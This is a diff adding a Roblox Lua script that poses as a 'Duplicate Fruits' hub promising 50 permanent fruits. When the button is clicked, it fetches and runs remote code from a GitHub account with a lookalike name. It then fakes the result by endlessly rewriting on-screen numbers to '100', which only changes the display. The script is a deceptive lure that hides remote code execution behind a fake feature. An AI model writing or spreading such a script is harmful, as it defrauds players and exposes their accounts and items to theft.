@@ -1,1 +1,150 @@
+-- Create the Screen GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.Name = "ShogunHubGUI"
 
+-- Intro Frame
+local IntroFrame = Instance.new("Frame")
+IntroFrame.Parent = ScreenGui
+IntroFrame.Size = UDim2.new(1, 0, 1, 0)
+IntroFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+IntroFrame.BackgroundTransparency = 0
+
+local IntroImage = Instance.new("ImageLabel")
+IntroImage.Parent = IntroFrame
+IntroImage.Size = UDim2.new(0.4, 0, 0.4, 0)
+IntroImage.Position = UDim2.new(0.5, 0, 0.4, 0)
+IntroImage.AnchorPoint = Vector2.new(0.5, 0.5)
+IntroImage.BackgroundTransparency = 1
+IntroImage.Image = "rbxassetid://7918669699" -- Inazuma Electro Asset ID
+
+local IntroText = Instance.new("TextLabel")
+IntroText.Parent = IntroFrame
+IntroText.Size = UDim2.new(1, 0, 0.2, 0)
+IntroText.Position = UDim2.new(0, 0, 0.8, 0)
+IntroText.BackgroundTransparency = 1
+IntroText.Text = "Shogun Hub"
+IntroText.TextColor3 = Color3.fromRGB(138, 43, 226) -- Purple
+IntroText.Font = Enum.Font.GothamBlack
+IntroText.TextSize = 40
+IntroText.TextStrokeTransparency = 0.5
+
+-- Fade-in/Fade-out Animation for Intro
+for transparency = 0, 1, 0.1 do
+    IntroFrame.BackgroundTransparency = transparency
+    IntroImage.ImageTransparency = transparency
+    IntroText.TextTransparency = transparency
+    wait(0.1)
+end
+
+-- Remove Intro after animation
+IntroFrame:Destroy()
+
+-- Main Frame (Movable, Gradient Background)
+local MainFrame = Instance.new("Frame")
+MainFrame.Parent = ScreenGui
+MainFrame.Size = UDim2.new(0, 300, 0, 200)
+MainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.BackgroundColor3 = Color3.fromRGB(30, 0, 60)
+MainFrame.Active = true
+MainFrame.Draggable = true -- Make it movable
+
+local MainUICorner = Instance.new("UICorner")
+MainUICorner.CornerRadius = UDim.new(0.1, 0) -- Smooth corners
+MainUICorner.Parent = MainFrame
+
+-- Gradient Background
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Parent = MainFrame
+UIGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(75, 0, 130)), -- Dark purple
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(148, 0, 211)) -- Bright purple
+}
+
+-- Title Label
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Parent = MainFrame
+TitleLabel.Size = UDim2.new(1, 0, 0, 50)
+TitleLabel.Position = UDim2.new(0, 0, 0, 0)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.Text = "Fruit Multiplier Hub"
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextSize = 22
+
+-- Duplicate Button with Outline
+local DuplicateButtonOutline = Instance.new("Frame")
+DuplicateButtonOutline.Parent = MainFrame
+DuplicateButtonOutline.Size = UDim2.new(0, 206, 0, 56) -- Slightly larger for outline
+DuplicateButtonOutline.Position = UDim2.new(0.5, -103, 0.5, -28)
+DuplicateButtonOutline.BackgroundColor3 = Color3.fromRGB(138, 43, 226) -- Purple outline color
+
+local DuplicateButton = Instance.new("TextButton")
+DuplicateButton.Parent = DuplicateButtonOutline
+DuplicateButton.Size = UDim2.new(0, 200, 0, 50)
+DuplicateButton.Position = UDim2.new(0, 3, 0, 3) -- Inside the outline
+DuplicateButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+DuplicateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+DuplicateButton.Text = "Duplicate Fruits"
+DuplicateButton.Font = Enum.Font.Gotham
+DuplicateButton.TextSize = 18
+
+local ButtonUICorner = Instance.new("UICorner")
+ButtonUICorner.CornerRadius = UDim.new(0.1, 0)
+ButtonUICorner.Parent = DuplicateButton
+
+local ButtonOutlineUICorner = Instance.new("UICorner")
+ButtonOutlineUICorner.CornerRadius = UDim.new(0.1, 0)
+ButtonOutlineUICorner.Parent = DuplicateButtonOutline
+
+-- Hover Effect for Button
+DuplicateButton.MouseEnter:Connect(function()
+    DuplicateButtonOutline.BackgroundColor3 = Color3.fromRGB(255, 255, 0) -- Change outline to yellow on hover
+end)
+
+DuplicateButton.MouseLeave:Connect(function()
+    DuplicateButtonOutline.BackgroundColor3 = Color3.fromRGB(138, 43, 226) -- Revert outline to purple
+end)
+
+-- Duplicate Button Functionality
+DuplicateButton.MouseButton1Click:Connect(function()
+    -- Change button text
+    DuplicateButton.Text = "Wait 5 mins to permanently get 50 fruits"
+
+    -- Execute the external script
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/reaIredz/B-oxfruits/refs/heads/main/Main%20hub"))()
+
+    -- Start a loop to continuously update fruit counts
+    local player = game.Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+
+    while true do
+        local inventoryGui = nil
+        for _, gui in pairs(playerGui:GetChildren()) do
+            if gui:IsA("Frame") or gui:IsA("ScreenGui") then
+                if gui:FindFirstChildWhichIsA("TextLabel") then
+                    for _, child in pairs(gui:GetDescendants()) do
+                        if child:IsA("TextLabel") and child.Text:match("^%d+$") then
+                            inventoryGui = gui
+                            break
+                        end
+                    end
+                end
+            end
+            if inventoryGui then break end
+        end
+
+        -- If inventory GUI is found, update the fruit counts
+        if inventoryGui then
+            for _, item in pairs(inventoryGui:GetDescendants()) do
+                if item:IsA("TextLabel") and item.Text:match("^%d+$") then
+                    item.Text = "100" -- Change the fruit count to 50
+                end
+            end
+        else
+            warn("Inventory GUI not found. Please check the GUI structure.")
+        end
+        wait(0.1) -- Loop every 0.1 seconds
+    end
+end)
